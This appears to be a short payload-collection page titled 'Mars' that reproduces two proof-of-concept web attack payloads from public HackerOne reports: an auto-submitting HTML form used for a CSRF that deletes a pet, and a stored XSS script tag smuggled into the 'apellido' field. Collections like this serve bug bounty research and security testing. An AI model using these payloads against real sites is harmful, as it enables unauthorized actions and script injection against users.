# Mars

2 payloads.

### `375dd962`

```
<html>
  <body>
    <form action="████">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

— [CSRF to delete a pet](https://hackerone.com/reports/2029753) · Mars · [d0rift](https://hackerone.com/d0rift)

### `85a681cd`

```
<input type="hidden" name="apellido" value="<script>alert()</script>" />
```

**Parameter:** `apellido`
— [Stored XSS + CSRF in "apellido" value](https://hackerone.com/reports/2037234) · Mars · [never_die](https://hackerone.com/never_die)
